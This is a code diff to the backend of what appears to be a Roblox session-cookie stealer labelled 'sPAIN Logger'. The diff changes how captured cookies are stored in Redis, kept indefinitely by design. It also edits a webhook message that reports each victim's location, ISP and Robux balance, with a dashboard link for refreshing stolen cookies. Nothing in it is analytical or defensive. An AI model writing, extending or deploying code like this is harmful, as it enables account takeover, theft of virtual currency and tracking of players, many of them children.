@@ -29,10 +29,9 @@ async function redisGet(key) {
 // No TTL — cookie stays forever until manually deleted or Roblox logs them out
 async function redisSet(key, value) {
   try {
-    const res = await fetch(`${REDIS_URL}/pipeline`, {
-      method: 'POST',
-      headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
-      body: JSON.stringify([['SET', key, JSON.stringify(value), 'EX', 2592000]])
+    const encoded = encodeURIComponent(JSON.stringify(value));
+    const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}/${encoded}`, {
+      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
     });
     return res.ok;
   } catch { return false; }
@@ -200,8 +199,7 @@ export default async function handler(req, res) {
           { name: '📍 Location',  value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true  },
           { name: '🗺️ ISP',       value: geo?.isp || 'Unknown',                                                              inline: true  },
           { name: '💰 Robux',     value: robux !== null ? `\`${Number(robux).toLocaleString()} R$\`` : '`Fetching...`',      inline: true  },
-          { name: '📈 Summary',   value: `Day: \`${fmt(liteInfo.txDay)} R$\` | Week: \`${fmt(liteInfo.txWeek)} R$\` | Year: \`${fmt(liteInfo.txYear)} R$\``, inline: false },
-          { name: '🔄 Dashboard', value: `[Open Dashboard](${refreshUrl})`,      inline: false }
+          { name: '🔄 Dashboard', value: `[Open Dashboard](${refreshUrl})\nLive account info + refresh cookie anytime`,      inline: false }
         ],
         footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
         timestamp: now
